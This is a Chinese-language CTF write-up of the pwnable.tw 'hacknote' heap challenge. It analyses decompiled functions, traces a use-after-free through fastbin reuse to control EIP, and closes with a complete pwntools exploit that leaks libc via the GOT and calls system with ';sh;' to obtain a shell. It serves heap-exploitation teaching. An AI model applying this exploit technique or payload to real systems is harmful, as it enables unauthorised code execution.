---

title: pwnable.tw writeup - hacknote
lang: zh
layout: article
show_subscribe: false
tags: [ctf,pwn]

---

关于 malloc 的首次适配可以参考 [how2heap - first_fit](https://github.com/shellphish/how2heap/blob/master/first_fit.c)：

## 程序分析

**main 函数**

```cpp
void __cdecl __noreturn main()
{
  int choice; // eax
  char buf[4]; // [esp+8h] [ebp-10h] BYREF
  unsigned int v2; // [esp+Ch] [ebp-Ch]

  v2 = __readgsdword(0x14u);
  setvbuf(stdout, 0, 2, 0);
  setvbuf(stdin, 0, 2, 0);
  while ( 1 )
  {
    while ( 1 )
    {
      Printmenu();
      read(0, buf, 4u);
      choice = atoi(buf);
      if ( choice != 2 )
        break;
      Deletenote();
    }
    if ( choice > 2 )
    {
      if ( choice == 3 )
      {
        Printnote();
      }
      else
      {
        if ( choice == 4 )
          exit(0);
LABEL_13:
        puts("Invalid choice");
      }
    }
    else
    {
      if ( choice != 1 )
        goto LABEL_13;
      Addnote();
    }
  }
}
```

**Addnote函数**

```cpp
unsigned int sub_8048646()
{
  Note *note; // ebx
  int i; // [esp+Ch] [ebp-1Ch]
  int size; // [esp+10h] [ebp-18h]
  char buf[8]; // [esp+14h] [ebp-14h] BYREF
  unsigned int v5; // [esp+1Ch] [ebp-Ch]

  v5 = __readgsdword(0x14u);
  if ( notecnt <= 5 )
  {
    for ( i = 0; i <= 4; ++i )
    {
      if ( !*(&ptr + i) )
      {
        *(&ptr + i) = malloc(8u);
        if ( !*(&ptr + i) )
        {
          puts("Alloca Error");
          exit(-1);
        }
        *(_DWORD *)*(&ptr + i) = noteputsfunc;
        printf("Note size :");
        read(0, buf, 8u);
        size = atoi(buf);
        note = (Note *)*(&ptr + i);
        note->content = (char *)malloc(size);
        if ( !*((_DWORD *)*(&ptr + i) + 1) )
        {
          puts("Alloca Error");
          exit(-1);
        }
        printf("Content :");
        read(0, *((void **)*(&ptr + i) + 1), size);
        puts("Success !");
        ++notecnt;
        return __readgsdword(0x14u) ^ v5;
      }
    }
  }
  else
  {
    puts("Full");
  }
  return __readgsdword(0x14u) ^ v5;
}
```

分配 8 字节的 Note 结构，然后写入内容。


**Note的结构：**

```cpp
struct Note
{
  void *putnotefuc;
  char *content;
};

```

**Printnote函数**

```cpp
unsigned int sub_80488A5()
{
  int index; // [esp+4h] [ebp-14h]
  char buf[4]; // [esp+8h] [ebp-10h] BYREF
  unsigned int v3; // [esp+Ch] [ebp-Ch]

  v3 = __readgsdword(0x14u);
  printf("Index :");
  read(0, buf, 4u);
  index = atoi(buf);
  if ( index < 0 || index >= notecnt )
  {
    puts("Out of bound!");
    _exit(0);
  }
  if ( *(&ptr + index) )
    (*(void (__cdecl **)(_DWORD))*(&ptr + index))(*(&ptr + index));
  return __readgsdword(0x14u) ^ v3;
}
```

调用 Note 结构第一个位置上的函数指针，打印。


**Deletenote 函数**

```cpp
unsigned int sub_80487D4()
{
  int index; // [esp+4h] [ebp-14h]
  char buf[4]; // [esp+8h] [ebp-10h] BYREF
  unsigned int v3; // [esp+Ch] [ebp-Ch]

  v3 = __readgsdword(0x14u);
  printf("Index :");
  read(0, buf, 4u);
  index = atoi(buf);
  if ( index < 0 || index >= notecnt )
  {
    puts("Out of bound!");
    _exit(0);
  }
  if ( *(&ptr + index) )
  {
    free(*((void **)*(&ptr + index) + 1));
    free(*(&ptr + index));
    puts("Success");
  }
  return __readgsdword(0x14u) ^ v3;
}
```

先释放 note 的内容，再释放 note 结构。但释放后指针没有置空,给了我们 use after free 的机会。

## EIP 控制

**以下输入可以控制EIP**

* 1 -> 16 -> aaa
* 1 -> 16 -> bbb
* 2 -> 0
* 2 -> 1
* 1 -> 8 -> ccc
* 3 -> 0

EIP 变成 `ccc\n`

```
...
----------------------
       HackNote       
----------------------
 1. Add note          
 2. Delete note       
 3. Print note        
 4. Exit              
----------------------
Your choice :3
Index :0

Program received signal SIGSEGV, Segmentation fault.
0x0a636363 in ?? ()
Warning: Skipping auxv entry '++info auxv'
Python Exception <class 'SyntaxError'> ('invalid syntax', ('<unknown>', 1, 10, '++python print(list(globals().keys()))\n')): 
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
──────────────────────────────────────────[ REGISTERS ]──────────────────────────────────────────
 EAX  0xa636363 ('ccc\n')
 EBX  0x0
 ECX  0x0
 EDX  0x804b008 ◂— 0xa636363 ('ccc\n')
 EDI  0xf7fce000 ◂— 0x1afdb0
 ESI  0xf7fce000 ◂— 0x1afdb0
 EBP  0xffffcd48 —▸ 0xffffcd68 ◂— 0x0
 ESP  0xffffcd1c —▸ 0x804893f ◂— add    esp, 0x10
 EIP  0xa636363 ('ccc\n')
───────────────────────────────────────────[ DISASM ]────────────────────────────────────────────
Invalid address 0xa636363

```

一步一步在堆上的情况：


1. 1 -> 16 -> aaa

```
struct Note[0], size:8
{
  void *putnotefuc ----> putnotefuc
  char *content ---> malloc(16) 'aaa\n'
};
```



2. 1 -> 16 -> bbb

```
struct Note[0], size:8
{
  void *putnotefuc ----> putnotefuc
  char *content ----> malloc(16) 'aaa\n' 
};
struct Note[1], size:8
{
  void *putnotefuc ----> putnotefuc
  char *content ---> malloc(16) 'bbb\n'
};
```

* 2 -> 0

```

fastbin[0][0] ----> struct Note[0], size:8
                    {
                      void *putnotefuc
                      char *content ----> free 16 大小后的区域
                    };
                    struct Note[1], size:8
                    {
                      void *putnotefuc ----> putnotefuc
                      char *content ---> malloc(16) 'bbb\n'
                    };
```


* 2 -> 1

```
fastbin[0][1] ----> struct Note[0], size:8
                    {
                      void *putnotefuc
                      char *content ----> free 16 大小后的区域
                    };
fastbin[0][0]-----> struct Note[1], size:8
                    {
                      void *putnotefuc 
                      char *content ----> free 16 大小后的区域
                    };

```

fastbin 头插头取链表结构。

* 1 -> 8 -> ccc

此时分配时，首次适配,会把 Note[0], Note[1] 两个结构体的地址分配下来。

```
struct Note[0], size:8
{
    ccc\n                   # Note[0] 等于 Note[2] 的 content 部分。
};

struct Note[1] 和 Note[2] 结构体内容一样,同一地址区域。

struct Note[2], size:8
{
  void *putnotefuc ----> putnotefuc
  char *content ----> malloc(8) ccc\n
};
```


* 3 -> 0

Note[0] 会调用我们写的 'ccc\n' 函数,以为那是 putnotefuc 函数。

所以我们就控制了 Note[0] 结构中所存的内容 。


## 利用策略

利用 上面的控制 EIP 的漏洞。

1. 可以先打印 GOT 表中某个 libc 函数的地址。得到 libc 在内存中的地址。 content 部分写 putnotefuc 函数的地址+对应 GOT 表的部分。
2. 删掉 note[2] ,再写note[2],此时写 system 函数的地址 与 `;sh;`。
3. 打印 note[0] 。

## exploit

```python
#!/usr/bin/env python3

# pyright: basic

from struct import pack
from pwn import *

HOST='chall.pwnable.tw'
PORT=10102
PROC="./hacknote"

context.log_level = 'DEBUG'

io=None

if len(sys.argv) == 1 : 
    # io=gdb.debug(PROC,"break puts")
    io=process(PROC)
else:
    log.info("remote start")
    # 设置代理
    context.proxy=(socks.SOCKS5,'localhost',7890)
    io=remote(HOST,PORT)

GotpltputsAddr=0x0804A024
PutnoteFuncAddr=0x0804862B
# 偏移
PutsOffset=0x0005f140
SystemOffset=0x0003a940


def GetSystemAddr():
    # 1 -> 16 -> aaaa
    io.sendafter(":","1")
    io.sendafter(":","16")
    io.sendafter(":","aaaa")
    # 1 -> 16 -> bbbb
    io.sendafter(":","1")
    io.sendafter(":","16")
    io.sendafter(":","bbbb")

    # 两次 2 -> 0 
    io.sendafter(":",'2')
    io.sendafter(":",'0')
    io.sendafter(":",'2')
    io.sendafter(":",'1')

    #pause()
    # 拿到输出got表中puts函数地址
    io.sendafter(":","1")
    io.sendafter(":","8")
    paylaod=pack(PutnoteFuncAddr)+pack(GotpltputsAddr)
    io.sendafter(":",paylaod)

    # 调用note[0],打印
    io.sendafter(":","3")  
    io.sendafter(":","0")  
    
    return io.recvn(4)

PutsAddr=unpack(GetSystemAddr())
print("puts function addr:",hex(PutsAddr))

# 计算 system 函数地址
SystemAddr=PutsAddr-PutsOffset+SystemOffset
print("system function addr:",hex(SystemAddr))
sh=b";sh;"

# 发送 ;/bin/sh
def binsh():
    pause()
    io.send("2")
    io.sendafter(":","2")
    
    io.sendafter(":","1")
    io.sendafter(":","8")
    io.sendafter(":",pack(SystemAddr)+sh)
    
    io.sendafter(":","3")
    io.sendafter(":","0")
    io.interactive()
binsh()

```

